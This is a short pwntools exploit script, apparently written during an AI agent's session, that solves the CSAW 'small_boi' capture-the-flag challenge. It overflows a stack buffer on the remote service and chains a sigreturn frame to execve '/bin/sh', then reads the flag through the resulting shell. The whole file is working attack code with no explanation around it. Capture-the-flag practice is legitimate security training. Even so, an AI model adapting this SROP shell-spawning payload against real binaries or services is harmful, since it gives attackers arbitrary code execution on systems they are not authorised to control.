from pwn import *

context.arch = "amd64"
context.binary = "./small_boi"

POP_RAX = 0x40018a
SYSCALL = 0x400185

p = remote("pwn.chal.csaw.io", 8000)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x4001ca
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL

payload = b"A" * 0x28
payload += p64(POP_RAX)
payload += p64(15)
payload += p64(SYSCALL)
payload += bytes(frame)
payload += b"/bin/sh\x00"

p.sendline(payload)
p.sendline(b"cat flag.txt")
print(p.recvall(timeout=3).decode("latin-1", errors="ignore"))
end_of_edit
